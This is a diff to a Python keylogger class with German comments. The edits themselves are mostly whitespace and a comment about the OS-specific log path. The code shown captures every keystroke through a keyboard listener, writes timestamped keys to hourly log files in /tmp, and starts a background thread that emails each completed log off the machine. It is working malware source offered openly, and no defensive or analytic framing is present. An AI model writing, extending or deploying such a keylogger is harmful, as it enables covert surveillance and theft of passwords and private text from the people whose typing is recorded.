@@ -13,13 +13,11 @@ class keylogger_class:
         global handle
         global send_go
         send_go=0
-
-        log_destination = "/tmp/" #Pfad zur Log datei
+        log_destination = "/tmp/" #Pfad zur Log datei   <--- !!!!!!!MUSS JE NACH OS EDITIERT WERDEN!!!!!!!
         now = datetime.now()
         new_filename = now.strftime("%Y%m%d%H") + ".log"      # zeitabstände
         old_filename = new_filename
         datei_sende_name=new_filename
-
         handle = open(log_destination + new_filename, "w")
 
         def send_email():
@@ -29,7 +27,7 @@ class keylogger_class:
                 if send_go==1:
                     init_email.email_sender_funk(log_destination,datei_sende_name)
                     send_go=0
-        
+
         email_thread=Thread(target=send_email)
         email_thread.start()
 
@@ -38,10 +36,8 @@ class keylogger_class:
             global new_filename
             global handle
             global send_go
-
             now = datetime.now()
             new_filename = now.strftime("%Y%m%d%H") + ".log"  # zeitabstände
-
             # Log entry
             try:
                 handle.write('{0}: {1} \n'.format(now.strftime("%d.%m.%Y, %H:%M:%S"), key.char))
@@ -50,16 +46,13 @@ class keylogger_class:
 
             # check and open new file
             zeahler=0
-            
             if old_filename != new_filename:
                 handle.close()
                 handle = open(log_destination + new_filename, "w")
                 old_filename = new_filename
-
                 if zeahler == 0:
                     send_go=1
                     zeahler=1
-
+                    
         with keyboard.Listener(on_press=on_press) as listener:
             listener.join()
-
